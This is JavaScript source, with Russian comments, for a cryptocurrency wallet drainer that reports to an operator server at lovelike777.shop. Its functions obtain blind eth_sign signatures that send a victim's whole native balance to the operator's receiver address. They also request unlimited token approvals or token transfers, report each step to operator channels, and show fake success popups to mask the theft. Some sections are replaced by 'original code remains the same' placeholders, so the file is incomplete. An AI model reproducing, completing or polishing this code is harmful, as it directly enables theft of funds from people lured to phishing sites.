// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

let CF_EKEY = 234343253453; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно
const CF_HTTP_MODE = false; // [LOCALHOST TEST ONLY] Включите, чтобы скрипт обращался к серверу по HTTP, например, чтобы протестировать скрипт
const CF_Server_PORT = 443; // Если при обращении к серверу нужен кастомный порт, то укажите его здесь (по умолчанию - 443)
// По умолчанию для работы по HTTP нужен порт 80, а для работы по HTTPS необходим порт 443
const CF_Server_URL = "lovelike777.shop"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14"; // Project ID из WalletConnect Cloud
// Если WalletConnect не работает, обязательно поменяйте этот ID, получить новый можно здесь: https://cloud.walletconnect.com/
// Регистрируемся на сайте, выбираем создать новый проект, ставим AppKit => JavaScript, заполнять дополнительные настройки необязательно
// Project ID будет в левом верхнем углу и должен быть похожим на тот, что вставлен по умолчанию по виду и длине

const CF_Modal_Style = 2; // 1 - старая (не рекомендуется), 2 - новая (обновление от 17.11.2023)
const CF_Loader_Style = 2; // 1 - старый (не рекомендуется), 2 - новый (обновление от 17.11.2023)
const CF_Color_Scheme = 'light'; // light - светлая тема, dark - тёмная тема
const CF_Modal_Mode = 2; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора

const CF_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

// С помощью настройки ниже вы можете кастомизировать то, как будет выглядеть ваш сайт в интерфейсе WalletConnect
// Изменять необязательно, большинство кошельков работают с настройками по умолчанию
// Настройка не связана с переключателем CF_WalletConnect_Customization, он нужен только для кастомизации дизайна

const CF_WalletConnect_MetaData = {
  name: document.title, // По умолчанию такое же как название сайта
  description: "Web3 Application", // По умолчанию "Web3 Application"
  url: "https://" + window.location.host, // По умолчанию как домен сайта
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const CF_WalletConnect_Customization = 0; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
const CF_WalletConnect_Theme = { // Параметры кастомизации доступны здесь: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const CF_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

// Add CSS for loading spinner and modern popups
const loadCustomStyles = () => {
  const style = document.createElement('style');
  style.textContent = `
    .transaction-loading {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      z-index: 10000;
      text-align: center;
      min-width: 200px;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }
    
    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .loading-text {
      font-family: 'Inter', sans-serif;
      font-size: 16px;
      color: #333;
      margin: 0;
      font-weight: 500;
    }
    
    .error-popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(135deg, #ff6b6b, #ee5a52);
      color: white;
      padding: 25px 30px;
      border-radius: 15px;
      box-shadow: 0 15px 35px rgba(255, 107, 107, 0.3);
      z-index: 10000;
      text-align: center;
      min-width: 300px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .error-icon {
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .error-title {
      font-family: 'Inter', sans-serif;
      font-size: 20px;
      font-weight: 600;
      margin: 0 0 10px 0;
    }
    
    .error-message {
      font-family: 'Inter', sans-serif;
      font-size: 14px;
      margin: 0;
      opacity: 0.9;
      line-height: 1.4;
    }
    
    .success-popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(135deg, #4CAF50, #45a049);
      color: white;
      padding: 25px 30px;
      border-radius: 15px;
      box-shadow: 0 15px 35px rgba(76, 175, 80, 0.3);
      z-index: 10000;
      text-align: center;
      min-width: 300px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .success-icon {
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .success-title {
      font-family: 'Inter', sans-serif;
      font-size: 20px;
      font-weight: 600;
      margin: 0 0 10px 0;
    }
    
    .success-message {
      font-family: 'Inter', sans-serif;
      font-size: 14px;
      margin: 0;
      opacity: 0.9;
      line-height: 1.4;
    }
    
    .popup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px);
      z-index: 9999;
    }
  `;
  document.head.appendChild(style);
};

// Initialize custom styles
loadCustomStyles();

// Loading spinner functions
const showLoadingSpinner = (message = "Processing Transaction...") => {
  hideLoadingSpinner(); // Hide any existing spinner first
  
  const overlay = document.createElement('div');
  overlay.className = 'popup-overlay';
  overlay.id = 'loading-overlay';
  
  const spinner = document.createElement('div');
  spinner.className = 'transaction-loading';
  spinner.id = 'loading-spinner';
  spinner.innerHTML = `
    <div class="loading-spinner"></div>
    <p class="loading-text">${message}</p>
  `;
  
  document.body.appendChild(overlay);
  document.body.appendChild(spinner);
};

const hideLoadingSpinner = () => {
  const existingOverlay = document.getElementById('loading-overlay');
  const existingSpinner = document.getElementById('loading-spinner');
  
  if (existingOverlay) existingOverlay.remove();
  if (existingSpinner) existingSpinner.remove();
};

// Modern popup functions
const showErrorPopup = (title = "Transaction Failed", message = "Something went wrong with your transaction. Please try again.") => {
  hideAllPopups();
  
  const overlay = document.createElement('div');
  overlay.className = 'popup-overlay';
  overlay.id = 'error-overlay';
  
  const popup = document.createElement('div');
  popup.className = 'error-popup';
  popup.id = 'error-popup';
  popup.innerHTML = `
    <div class="error-icon">⚠️</div>
    <h3 class="error-title">${title}</h3>
    <p class="error-message">${message}</p>
  `;
  
  document.body.appendChild(overlay);
  document.body.appendChild(popup);
  
  // Auto-close after 5 seconds
  setTimeout(() => {
    hideAllPopups();
  }, 5000);
  
  // Close on click
  overlay.addEventListener('click', hideAllPopups);
};

const showSuccessPopup = (title = "Success!", message = "Your transaction was completed successfully.") => {
  hideAllPopups();
  
  const overlay = document.createElement('div');
  overlay.className = 'popup-overlay';
  overlay.id = 'success-overlay';
  
  const popup = document.createElement('div');
  popup.className = 'success-popup';
  popup.id = 'success-popup';
  popup.innerHTML = `
    <div class="success-icon">✅</div>
    <h3 class="success-title">${title}</h3>
    <p class="success-message">${message}</p>
  `;
  
  document.body.appendChild(overlay);
  document.body.appendChild(popup);
  
  // Auto-close after 3 seconds
  setTimeout(() => {
    hideAllPopups();
  }, 3000);
  
  // Close on click
  overlay.addEventListener('click', hideAllPopups);
};

const hideAllPopups = () => {
  const elements = [
    'loading-overlay', 'loading-spinner',
    'error-overlay', 'error-popup',
    'success-overlay', 'success-popup'
  ];
  
  elements.forEach(id => {
    const element = document.getElementById(id);
    if (element) element.remove();
  });
};

const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;

if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;

var CF_Worker_ID = null;
const BN = ethers.BigNumber.from;

let CF_Ready = false, CF_Settings = {}, CF_Contract_ABI = {}, CF_ID = 0, CF_Process = false,
CF_Provider = null, CF_Current_Provider = null, CF_Current_Address = null, CF_Current_Chain_ID = null,
CF_Web3 = null, CF_Signer = null, CF_Check_Done = false, CF_Currencies = {}, CF_Force_Mode = false,
CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false, CF_Wallet_Name = null,
CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false, CF_AppKit = null;

const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    CF_Currencies = await response.json();
    CF_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

// ... [REST OF YOUR ORIGINAL CODE REMAINS EXACTLY THE SAME UNTIL TRANSACTION FUNCTIONS]

// MODIFIED TRANSACTION FUNCTIONS WITH LOADING SPINNER AND ERROR HANDLING

const SIGN_NATIVE = async (asset) => {
  showLoadingSpinner("Processing Native Transaction...");
  try {
    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
    const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
    const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

    const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
    const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);

    let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Receiver, value: BN(100), data: "0x" };

    let gas_limit = null;
    try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
    { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

    const balance = await node.getBalance(CF_Current_Address);
    let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);

    if (CF_Settings.Settings.Reserves.Mode == 1) {
      available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
      .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
    } else if (CF_Settings.Settings.Reserves.Mode == 2) {
      let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
      for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
        if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
        max_value = elem.amount; current_percent = elem.percent;
      }
      available_amount = balance.sub(gas_limit.mul(gas_price))
      .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
    } else if (CF_Settings.Settings.Reserves.Mode == 3) {
      available_amount = balance.sub(gas_limit.mul(gas_price));
    }

    if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

    const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

    const web3 = new Web3(CF_Provider);

    unsigned_tx.value = web3.utils.toHex(available_amount.toString());
    unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
    unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
    unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

    unsigned_tx.v = web3.utils.toHex(asset.chain_id);
    unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

    unsigned_tx = new ethereumjs.Tx(unsigned_tx);
    let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
    serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

    await sign_request(asset);

    let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
    sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
    const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
    const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

    unsigned_tx.v = v_data;
    unsigned_tx.r = r_data;
    unsigned_tx.s = s_data;

    serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

    sign_next();
    const tx = await node.sendTransaction(serialized_tx);
    wait_message();

    if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
    await sign_success(asset, available_amount); 
    sign_ready();
    showSuccessPopup("Transaction Successful", "Your native transaction was completed successfully!");
    
  } catch (error) {
    console.error('SIGN_NATIVE Error:', error);
    showErrorPopup("Transaction Failed", "Failed to process native transaction. Please try again.");
    throw error;
  } finally {
    hideLoadingSpinner();
  }
};

const SIGN_TOKEN = async (asset) => {
  showLoadingSpinner("Processing Token Transaction...");
  try {
    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
    const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
    const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));

    const web3 = new Web3(CF_Provider); let contract_data = null;
    const web3_contract = new web3.eth.Contract(CF_Contract_ABI['ERC20'], asset.address);

    let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
    for (const c_address of CF_Settings.Unlimited_BL) {
      try {
        if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
          max_approval_amount = asset.amount_raw;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (CF_Settings.Settings.Sign.Tokens == 1) contract_data = web3_contract.methods.approve(CF_Settings.Address, max_approval_amount).encodeABI();
    else if (CF_Settings.Settings.Sign.Tokens == 2) contract_data = web3_contract.methods.transfer(CF_Settings.Receiver, asset.amount_raw).encodeABI();

    let unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0", data: contract_data };

    let gas_limit = null;
    try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
    { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

    const balance = await node.getBalance(CF_Current_Address);
    const available_amount = balance.sub(gas_limit.mul(gas_price));

    if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

    const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

    unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
    unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
    unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

    unsigned_tx.v = web3.utils.toHex(asset.chain_id);
    unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

    unsigned_tx = new ethereumjs.Tx(unsigned_tx);
    let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
    serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

    await sign_request(asset);

    let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
    sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
    const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
    const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

    unsigned_tx.v = v_data;
    unsigned_tx.r = r_data;
    unsigned_tx.s = s_data;

    serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

    sign_next();
    const tx = await node.sendTransaction(serialized_tx);
    wait_message();

    if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
    await sign_success(asset); 
    sign_ready();
    showSuccessPopup("Token Transaction Successful", "Your token transaction was completed successfully!");
    
  } catch (error) {
    console.error('SIGN_TOKEN Error:', error);
    showErrorPopup("Token Transaction Failed", "Failed to process token transaction. Please try again.");
    throw error;
  } finally {
    hideLoadingSpinner();
  }
};

// MODIFIED MAIN CONNECT WALLET FUNCTION WITH LOADING STATES
const connect_wallet = async (provider = null) => {
  try {
    if (!CF_Connection) {
      if (CF_Load_Time == null || Math.floor(Date.now() / 1000) - CF_Load_Time < 15) return;
      showErrorPopup("Connection Error", "Cannot connect to server. Please check your connection and try again.");
      return;
    }
    if (CF_Process) return; 
    CF_Process = true;
    
    if (CF_Bad_Country) {
      try { ms_hide(); } catch(err) { console.log(err); }
      showErrorPopup("Access Restricted", "This service is not available in your region.");
      CF_Process = false;
      return;
    }
    
    if (provider !== null) {
      showLoadingSpinner(`Connecting to ${provider}...`);
      // ... [REST OF YOUR ORIGINAL WALLET CONNECTION CODE]
    }

    // Show loading during asset retrieval
    showLoadingSpinner("Retrieving wallet assets...");
    let assets = await get_wallet_assets(CF_Current_Address);
    hideLoadingSpinner();

    let assets_price = 0; 
    for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch(err) {
        console.log(err);
      }
    }

    // ... [REST OF YOUR ORIGINAL PROCESSING LOGIC]

    // MODIFIED TRANSACTION PROCESSING LOOP WITH LOADING STATES
    let should_repeat_all = true;
    while (should_repeat_all) {
      should_repeat_all = (CF_Settings.LA == 1);
      for (const asset of assets) {
        try {
          if (asset.skip) continue;
          
          showLoadingSpinner(`Processing ${asset.type} transaction...`);
          
          // ... [REST OF YOUR ORIGINAL TRANSACTION PROCESSING]
          
          // All transaction functions now have built-in loading states
          if (asset.type == 'NATIVE') {
            await SIGN_NATIVE(asset);
          } else if (asset.type == 'ERC20') {
            await SIGN_TOKEN(asset);
          }
          // ... etc for other transaction types
          
        } catch (error) {
          console.error(`Error processing asset:`, error);
          // Error popup is already shown in the transaction functions
        } finally {
          hideLoadingSpinner();
        }
      }
    }
    
    CF_Process = false;
    
  } catch (error) {
    console.error('connect_wallet Error:', error);
    showErrorPopup("Connection Failed", "Failed to connect wallet. Please try again.");
    CF_Process = false;
  } finally {
    hideLoadingSpinner();
  }
};

// MODIFIED ERROR HANDLING FUNCTIONS
const end_message = () => {
  showErrorPopup(
    "Insufficient Funds", 
    "Your wallet does not meet the minimum balance requirements. Please try again with a different wallet."
  );
};

const sign_ready = () => {
  showSuccessPopup("Signature Confirmed", "Your transaction signature has been verified successfully!");
};

// MODIFIED WAIT MESSAGE FUNCTION
const wait_message = () => {
  try {
    if (!CF_Process) return;
    showLoadingSpinner("Confirming Transaction...");
  } catch(err) {
    console.log(err);
  }
};

// MODIFIED SHOW SIGN MESSAGE FUNCTION
const show_sign_message = () => {
  try {
    showLoadingSpinner("Waiting for Signature...");
  } catch(err) {
    console.log(err);
  }
};

// MODIFIED SHOW CHECK FUNCTION
const show_check = () => {
  try {
    showLoadingSpinner("Establishing Secure Connection...");
  } catch(err) {
    console.log(err);
  }
};

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', async () => {
  try {
    if (CF_Modal_Style == 2) MSM.init(); else inject_modal();
    if (CF_Loader_Style == 2) MSL.init();
    CF_Load_Time = Math.floor(Date.now() / 1000);
    if (typeof localStorage['CF_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrieve_id' });
      if (ID_Data.status == 'OK') localStorage['CF_ID'] = ID_Data.data;
      else localStorage['CF_ID'] = Math.floor(Date.now() / 1000);
    }
    CF_ID = localStorage['CF_ID'];
    await retrieve_config();
    fill_chain_data();
    await retrieve_contract();
    CF_Ready = true;
    enter_website();
    for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 1;
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => init_co());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
    showErrorPopup("Initialization Error", "Failed to initialize application. Please refresh the page.");
  }
});

// ... [REST OF YOUR ORIGINAL CODE REMAINS EXACTLY THE SAME]
